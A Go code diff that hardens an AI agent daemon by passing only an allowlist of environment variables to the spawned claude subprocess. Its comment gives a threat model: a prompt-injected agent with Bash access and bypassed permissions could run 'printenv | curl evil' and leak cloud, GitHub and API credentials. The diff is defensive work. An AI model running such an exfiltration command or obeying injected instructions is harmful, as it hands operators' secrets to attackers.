@@ -8,16 +8,72 @@ package agent
 import (
 	"context"
 	"os"
+	"strings"
 )
 
-// mergedEnv returns the process environment with `extra` (KEY=VALUE entries)
-// layered on top — later entries win, so callers put overrides (e.g.
-// ANTHROPIC_BASE_URL) last. A nil/empty extra returns os.Environ() unchanged.
+// envAllowlist is the small set of operator-environment variables the agent
+// subprocess needs to function correctly. Anything outside this list is
+// dropped before the child sees it.
+//
+// Why an allowlist instead of pass-through: `claude` (and any sibling driver
+// invoked here) runs with `--permission-mode bypassPermissions` plus Bash
+// tool access — a prompt-injected agent can `printenv | curl evil`. The
+// daemon's own `os.Environ()` is the operator's full shell environment, so
+// pass-through hands every `AWS_*`, `GH_TOKEN`, `GITHUB_TOKEN`,
+// `OPENAI_API_KEY`, `SSH_AUTH_SOCK`, `AZURE_*`, `GCP_*`, … straight to a
+// process running attacker-controlled instructions. Rounds 4-5 took care to
+// keep the control-bus capability token off env (stdin only) and to feed
+// octo-cli tokens on stdin too; that hardening was effectively negated by
+// the agent inheriting the parent env wholesale.
+//
+// The allowlist is the minimum set we've found empirically lets `claude`
+// spawn, locate its CLI deps, and read user-facing locale/time. Additional
+// per-bot env (ANTHROPIC_*, OCTO_*, CLAUDE_CONFIG_DIR, …) flows through the
+// `extra` parameter, NOT via inheritance. Operators with unusual setups can
+// extend the list, but the default is fail-closed.
+var envAllowlist = map[string]struct{}{
+	"HOME":              {}, // ~/.claude lookups, ~/.npmrc, etc.
+	"USER":              {}, // some CLIs read it for prompts/log lines
+	"LOGNAME":           {}, // POSIX alias for USER
+	"PATH":              {}, // resolve `node`, `git`, `claude`, etc.
+	"SHELL":             {}, // some agents shell out for tool invocation
+	"TMPDIR":            {}, // child writes scratch files
+	"TMP":               {}, // Windows analogue
+	"TEMP":              {}, // Windows analogue
+	"LANG":              {}, // locale; affects message formatting
+	"LC_ALL":            {}, // locale override
+	"LC_CTYPE":          {}, // locale subset commonly set on macOS
+	"TZ":                {}, // time zone
+	"TERM":              {}, // some CLIs check before printing ANSI
+	"SSL_CERT_FILE":     {}, // CA bundle override
+	"SSL_CERT_DIR":      {}, // CA bundle override
+	"NODE_PATH":         {}, // node module resolution for claude
+	"NODE_OPTIONS":      {}, // operator-tuned node flags
+	"NPM_CONFIG_PREFIX": {}, // npm-installed claude lookups
+}
+
+// mergedEnv returns the agent's spawn environment: the allowlisted subset of
+// the daemon's os.Environ() with `extra` (KEY=VALUE entries) layered on top,
+// later entries winning so callers put overrides (e.g. ANTHROPIC_BASE_URL)
+// last. See envAllowlist for why pass-through was retired.
+//
+// Variables starting with LC_ are auto-included (POSIX locale family).
+// A nil/empty extra returns just the allowlisted base.
 func mergedEnv(extra []string) []string {
-	if len(extra) == 0 {
-		return os.Environ()
+	base := os.Environ()
+	out := make([]string, 0, len(base)+len(extra))
+	for _, e := range base {
+		eq := strings.IndexByte(e, '=')
+		if eq <= 0 {
+			continue
+		}
+		k := e[:eq]
+		if _, ok := envAllowlist[k]; ok || strings.HasPrefix(k, "LC_") {
+			out = append(out, e)
+		}
 	}
-	return append(os.Environ(), extra...)
+	out = append(out, extra...)
+	return out
 }
 
 // EventKind classifies a normalized agent event.
